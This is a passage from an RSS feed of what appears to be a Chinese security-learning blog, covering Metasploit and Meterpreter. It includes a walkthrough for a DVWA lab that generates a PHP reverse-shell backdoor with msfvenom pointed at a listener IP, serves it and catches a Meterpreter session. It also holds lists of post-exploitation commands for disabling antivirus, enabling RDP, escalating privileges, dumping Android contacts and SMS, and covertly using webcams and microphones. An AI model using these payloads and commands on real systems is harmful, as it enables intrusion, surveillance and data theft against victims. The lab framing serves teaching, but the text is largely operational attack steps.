 关闭杀毒软件：run post/windows/manage/killav&lt;br&gt;
 启动远程桌面协议：run post/windows/manage/enable_rdp&lt;br&gt;
 列举当前登录的用户：run post/windows/gather/enum_logged_on_users&lt;br&gt;
 查看当前应用程序：run post/windows/gather/enum_applications&lt;br&gt;
 抓取目标机的屏幕截图：load espia ； screengrab&lt;br&gt;
 抓取摄像头的照片：webcam_snap&lt;br&gt;
 查看当前处于目标机的那个目录：pwd&lt;br&gt;
 查看当前目录：getlwd&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/</guid>
            <title>PHP后门反弹演示</title>
            <link>https://mangpumo.github.io/2023/01/12/PHP%E5%90%8E%E9%97%A8%E5%8F%8D%E5%BC%B9%E6%BC%94%E7%A4%BA/</link>
            <pubDate>Thu, 12 Jan 2023 04:48:56 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-环境准备&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-环境准备&#34;&gt;#&lt;/a&gt; 一、 环境准备&lt;/h1&gt;
&lt;h3 id=&#34;1-dvwa靶场&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-dvwa靶场&#34;&gt;#&lt;/a&gt; 1 DVWA 靶场&lt;/h3&gt;
&lt;p&gt;DVWA 下载：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jb2RlbG9hZC5naXRodWIuY29tL2V0aGljYWxoYWNrM3IvRFZXQS96aXAvbWFzdGVy&#34;&gt;https://codeload.github.com/ethicalhack3r/DVWA/zip/master&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;注意：配置 DVWA 环境 准备 PHP7.0 以上，和 Nginx 环境&lt;br&gt;
 1 配置数据库密码  配置 config/config.inc.php.dist 文件（注意后门的 .dist 要通过重命名删掉）&lt;br&gt;
2 使用浏览器访问 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL1h4SVAvc2V0dXAucGhw&#34;&gt;http://XxIP/setup.php&lt;/span&gt;&lt;br&gt;
3 红字问题解决&lt;br&gt;
 4 缺少 key  直接替换下面 2 句  或者 访问 https://www.google.com/recaptcha/admin/create&lt;br&gt;
&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mrow&gt;&lt;/mrow&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;W&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;u&lt;/mi&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;k&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo stretchy=&#34;false&#34;&gt;]&lt;/mo&gt;&lt;msup&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mi&gt;L&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mi&gt;l&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;U&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;H&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mn&gt;6&lt;/mn&gt;&lt;mi&gt;c&lt;/mi&gt;&lt;mi&gt;T&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;Z&lt;/mi&gt;&lt;mi&gt;R&lt;/mi&gt;&lt;mi&gt;Q&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mi&gt;A&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mn&gt;8&lt;/mn&gt;&lt;mi&gt;V&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;y&lt;/mi&gt;&lt;mi&gt;z&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mi&gt;D&lt;/mi&gt;&lt;mn&gt;0&lt;/mn&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;B&lt;/mi&gt;&lt;msup&gt;&lt;mi&gt;b&lt;/mi&gt;&lt;mo mathvariant=&#34;normal&#34; lspace=&#34;0em&#34; rspace=&#34;0em&#34;&gt;′&lt;/mo&gt;&lt;/msup&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;_DVWA[ &amp;#x27;recaptcha_public_key&amp;#x27; ] = &amp;#x27;6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb&amp;#x27;;
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1.038em;vertical-align:-0.286108em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.32833099999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;W&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15139200000000003em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34;&gt;p&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.286108em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;u&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.33610799999999996em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathnormal mtight&#34; style=&#34;margin-right:0.03148em;&#34;&gt;k&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.946332em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.01968em;&#34;&gt;l&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10903em;&#34;&gt;U&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.08125em;&#34;&gt;H&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.13889em;&#34;&gt;T&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.07153em;&#34;&gt;Z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.00773em;&#34;&gt;R&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;Q&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;A&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.22222em;&#34;&gt;V&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.03588em;&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.04398em;&#34;&gt;z&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;D&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.05017em;&#34;&gt;B&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.751892em;&#34;&gt;&lt;span style=&#34;top:-3.063em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;′&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_DVWA[ &#39;recaptcha_private_key&#39; ] = &#39;6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K&#39;;&lt;br&gt;
5 allow_url_include: Disabled  提示没开启&lt;br&gt;
找到 php 目录里的 php.ini allow_url_include  将后面参数 OFF 改成 On 修改完成重启 Nginx 生效&lt;/p&gt;
&lt;h3 id=&#34;2-metasploit任意平台&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-metasploit任意平台&#34;&gt;#&lt;/a&gt; 2 Metasploit 任意平台&lt;/h3&gt;
&lt;p&gt;可以是 Windows 版，可以是 kali 自带版&lt;/p&gt;
&lt;h1 id=&#34;二-metasploit配置监控及攻击载荷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-metasploit配置监控及攻击载荷&#34;&gt;#&lt;/a&gt; 二、Metasploit 配置监控及攻击载荷&lt;/h1&gt;
&lt;h3 id=&#34;1-配置监控-使用handler模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-配置监控-使用handler模块&#34;&gt;#&lt;/a&gt; 1 配置监控 - 使用 handler 模块&lt;/h3&gt;
&lt;h3 id=&#34;use-exploitmultihandler&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#use-exploitmultihandler&#34;&gt;#&lt;/a&gt; use exploit/multi/handler&lt;/h3&gt;
&lt;h3 id=&#34;img-2-配置攻击载荷设置payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#img-2-配置攻击载荷设置payload&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/a2529fe010ac46108a0413b8153c08b0.png&#34; alt=&#34;img&#34;&gt;  2 配置攻击载荷设置 payload&lt;/h3&gt;
&lt;h3 id=&#34;第一步设置payload&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第一步设置payload&#34;&gt;#&lt;/a&gt; 第一步设置 payload&lt;/h3&gt;
&lt;h3 id=&#34;set-payload-phpmeterpreterreverse_tcp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-payload-phpmeterpreterreverse_tcp&#34;&gt;#&lt;/a&gt; set payload php/meterpreter/reverse_tcp&lt;/h3&gt;
&lt;h3 id=&#34;第二步设置-lhost-和-lport&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二步设置-lhost-和-lport&#34;&gt;#&lt;/a&gt; 第二步设置 lhost 和 lport&lt;/h3&gt;
&lt;h3 id=&#34;set-lhost-xxxip&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-lhost-xxxip&#34;&gt;#&lt;/a&gt; set lhost xxxip ；&lt;/h3&gt;
&lt;h3 id=&#34;set-lport-xxx端口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#set-lport-xxx端口&#34;&gt;#&lt;/a&gt; set lport  xxx 端口；&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/ad204b7bb1bc4c709f4d6948d4ef219a.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;3-生成php后门执行攻击获得meterpreter&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-生成php后门执行攻击获得meterpreter&#34;&gt;#&lt;/a&gt; 3 生成 php 后门执行攻击获得 meterpreter&lt;/h3&gt;
&lt;p&gt;新建一个终端在终端内输入&lt;/p&gt;
&lt;p&gt;msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 R&amp;gt;shell.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1fa4967afb3f487f84926004d4ddc591.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;3.2 传播 - 使用 Python 简单的 web 服务&lt;/p&gt;
&lt;p&gt;python -m SimpleHTTPServer 80&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/6604546c76d7471e9f332e81daf6c570.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;将 shell.php&lt;/p&gt;
&lt;p&gt;3.3 执行攻击获得 meterpreter&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1641417576000/1003035b32a343488a282bddec48a62b.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;run 或者 exploit&lt;/p&gt;
&lt;p&gt;获取到 meterpreter 我们就可以做渗透操作了&lt;/p&gt;
&lt;p&gt;比如 观看屏幕 可以在 meterpreter 里输入&lt;/p&gt;
&lt;p&gt;run vnc&lt;/p&gt;
&lt;p&gt;查看当前账号可以在 meterpreter 里输入&lt;/p&gt;
&lt;p&gt;getuid&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/meterpreter/</guid>
            <title>meterpreter</title>
            <link>https://mangpumo.github.io/2023/01/12/meterpreter/</link>
            <pubDate>Thu, 12 Jan 2023 04:46:09 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-meterpreter是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-meterpreter是什么&#34;&gt;#&lt;/a&gt; 一、 Meterpreter 是什么&lt;/h1&gt;
&lt;p&gt;Meterpreter 是 Metasploit 框架中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令！&lt;br&gt;
Metasploit 提供了各个主流平台的 Meterpreter 版本，包括 Windows、Linux，同时支持 x86、x64 平台，另外，Meterpreter 还提供了基于 PHP 和 Java 语言的实现。Meterpreter 的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter 还支持 Ruby 脚本形式的扩展。所以 Ruby 语言还很有必要了解下。&lt;/p&gt;
&lt;h1 id=&#34;二-meterpreter中常用的反弹类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-meterpreter中常用的反弹类型&#34;&gt;#&lt;/a&gt; 二、Meterpreter 中常用的反弹类型&lt;/h1&gt;
&lt;p&gt;1.reverse_tcp&lt;br&gt;
 这是一个基于 TCP 的反向链接反弹 shell, 使用起来很稳定&lt;/p&gt;
&lt;h1 id=&#34;三-meterpreter的常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#三-meterpreter的常用命令&#34;&gt;#&lt;/a&gt; 三、Meterpreter 的常用命令&lt;/h1&gt;
&lt;h2 id=&#34;1基本命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1基本命令&#34;&gt;#&lt;/a&gt; 1. 基本命令&lt;/h2&gt;
&lt;p&gt;help# 查看 Meterpreter 帮助&lt;/p&gt;
&lt;p&gt;background# 返回，把 meterpreter 后台挂起&lt;br&gt;
 bgkill# 杀死一个 meterpreter 脚本&lt;br&gt;
 bglist# 提供所有正在运行的后台脚本的列表&lt;br&gt;
 bgrun# 作为一个后台线程运行脚本&lt;br&gt;
 channel# 显示活动频道&lt;br&gt;
 sessions -i number # 与会话进行交互，number 表示第 n 个 session, 使用 session -i 连接到指定序号的 meterpreter 会话已继续利用&lt;br&gt;
 sesssions -k  number #与会话进行交互&lt;br&gt;
 close# 关闭通道&lt;br&gt;
 exit# 终止 meterpreter 会话&lt;br&gt;
 quit# 终止 meterpreter 会话&lt;br&gt;
 interact id #切换进一个信道&lt;br&gt;
 run# 执行一个已有的模块，这里要说的是输入 run 后按两下 tab，会列出所有的已有的脚本，常用的有 autoroute,hashdump,arp_scanner,multi_meter_inject 等&lt;br&gt;
 irb# 进入 Ruby 脚本模式&lt;br&gt;
 read# 从通道读取数据 write# 将数据写入到一个通道&lt;br&gt;
 run 和 bgrun# 前台和后台执行以后它选定的 meterpreter 脚本&lt;br&gt;
 use# 加载 meterpreter 的扩展&lt;br&gt;
 load/use# 加载模块&lt;br&gt;
 Resource# 执行一个已有的 rc 脚本&lt;/p&gt;
&lt;h2 id=&#34;2-常用命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-常用命令&#34;&gt;#&lt;/a&gt; 2  常用命令&lt;/h2&gt;
&lt;h3 id=&#34;21-针对安卓手机的一些命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#21-针对安卓手机的一些命令&#34;&gt;#&lt;/a&gt; 2.1 针对安卓手机的一些命令&lt;/h3&gt;
&lt;p&gt;获取手机通讯录： dump_contacts&lt;/p&gt;
&lt;p&gt;获取短信记录：dump_sms&lt;/p&gt;
&lt;p&gt;控制实验手机发短信：send_sms -d 15330252525 -t&lt;br&gt;
&amp;quot;hello&amp;quot;&lt;/p&gt;
&lt;p&gt;获取实验手机 GPS 定位信息：geolocate&lt;/p&gt;
&lt;p&gt;获取实验手机 Wi-Fi 定位信息：wlan_geolocate&lt;/p&gt;
&lt;p&gt;控制实验手机录音：record_mic&lt;br&gt;
-d  5&lt;/p&gt;
&lt;p&gt;获取实验手机相机设备：webcam_list&lt;/p&gt;
&lt;p&gt;控制实验手机拍照 ：webcam_snap&lt;/p&gt;
&lt;p&gt;直播实验手机摄像头：webcam_stream&lt;/p&gt;
&lt;h3 id=&#34;22-针对windows的一些命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#22-针对windows的一些命令&#34;&gt;#&lt;/a&gt; 2.2 针对 Windows 的一些命令&lt;/h3&gt;
&lt;p&gt;查看进程：ps&lt;/p&gt;
&lt;p&gt;查看当前进程号：getpid&lt;/p&gt;
&lt;p&gt;查看系统信息：sysinfo&lt;/p&gt;
&lt;p&gt;查看目标机是否为虚拟机：run&lt;br&gt;
post/windows/gather/checkvm&lt;/p&gt;
&lt;p&gt;查看完整网络设置：route&lt;/p&gt;
&lt;p&gt;查看当前权限：getuid&lt;/p&gt;
&lt;p&gt;自动提权：getsystem&lt;/p&gt;
&lt;p&gt;关闭杀毒软件：run post/windows/manage/killav&lt;/p&gt;
&lt;p&gt;启动远程桌面协议：run post/windows/manage/enable_rdp&lt;/p&gt;
&lt;p&gt;列举当前登录的用户：run post/windows/gather/enum_logged_on_users&lt;/p&gt;
&lt;p&gt;查看当前应用程序：run post/windows/gather/enum_applications&lt;/p&gt;
